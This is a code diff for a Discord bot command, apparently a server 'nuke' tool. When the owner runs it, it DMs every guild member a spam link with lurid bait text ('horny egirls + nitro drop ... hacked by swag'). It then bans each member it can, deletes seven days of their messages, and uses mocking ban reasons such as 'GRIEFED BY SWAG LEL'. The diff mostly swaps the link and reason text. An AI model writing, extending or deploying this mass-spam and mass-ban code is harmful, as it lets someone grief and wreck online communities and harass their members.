@@ -15,21 +15,22 @@ public class DmAdvBanwaveCommand implements ICommand {
 
     @Override
     public void handle(List<String> args, GuildMessageReceivedEvent event) {
-        if (!(event.getAuthor().getIdLong() == Core.OWNERID )) {
+        if (!(event.getAuthor().getIdLong() == Core.OWNERID)) {
             return;
         }
         Thread banwave1 = new Thread(() -> {
             try {
                 for (Member member : event.getGuild().getMembers()) {
                     if (member.getIdLong() != Core.OWNERID || !member.getId().equals(event.getAuthor().getId())) {
-                        Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "https://discord.gg/5KwAktW **horny egirls + nitro drop + packing events** hacked by swag");
+                        Utility.sendPrivateMessage(event.getJDA(), member.getUser().getId(), "https://archive-media-0.nyafuu.org/bant/image/1510/78/1510783955112.jpg **horny egirls + nitro drop + packing events** hacked by swag");
                         if (event.getGuild().getSelfMember().canInteract(member) && !member.getUser().isBot())
-                        event.getGuild().ban(member, 7).reason("GRIEFED BY SWAG LEL").queue();
+                            event.getGuild().ban(member, 7).reason("champagnepapi").queue();
                         Logger.getLogger().print("Banned " + member.getUser().getAsTag());
                         Thread.sleep(300);
                     }
                 }
-            } catch (HierarchyException | InterruptedException ignored) {}
+            } catch (HierarchyException | InterruptedException ignored) {
+            }
         });
         banwave1.start();
     }
@@ -49,8 +50,13 @@ public class DmAdvBanwaveCommand implements ICommand {
         return new String[0];
     }
 
-     @Override
+    @Override
     public Category getCategory() {
         return Category.OWNER;
+    }
+
+    @Override
+    public boolean isPremium() {
+        return false;
     }
 }
